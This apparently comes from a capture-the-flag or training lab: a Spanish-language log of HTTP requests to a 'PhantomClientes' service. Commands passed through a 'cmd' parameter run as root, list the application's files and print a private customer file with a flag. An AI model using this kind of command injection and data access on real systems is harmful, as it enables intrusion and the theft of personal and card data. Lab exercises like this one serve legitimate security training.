@@ -1,0 +1,39 @@
+Verificación independiente de Juan — Lab Final (H-01)
+Fecha: 2026-11-07
+
+=== 1. Consulta de control sin token (/api/reporte?cmd=id) ===
+HTTP/1.0 403 Forbidden
+Server: PhantomClientes/2.0 
+Date: Sat, 07 Nov 2026 21:53:23 GMT
+Content-Type: text/plain
+
+token invalido; conseguilo del backup de RRHH
+
+=== 2. Consulta con token y verificación de privilegios (cmd=id) ===
+HTTP/1.0 200 OK
+Server: PhantomClientes/2.0 
+Date: Sat, 07 Nov 2026 21:53:23 GMT
+Content-Type: text/plain
+
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+
+=== 3. Consulta con token y búsqueda de archivos en /app ===
+HTTP/1.0 200 OK
+Server: PhantomClientes/2.0 
+Date: Sat, 07 Nov 2026 21:53:23 GMT
+Content-Type: text/plain
+
+$ find /app -maxdepth 3 -type f
+/app/priv/clientes.db.txt
+/app/server.py
+
+=== 4. Consulta con token y lectura del archivo de clientes ===
+HTTP/1.0 200 OK
+Server: PhantomClientes/2.0 
+Date: Sat, 07 Nov 2026 21:53:23 GMT
+Content-Type: text/plain
+
+$ cat /app/priv/clientes.db.txt
+clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
+
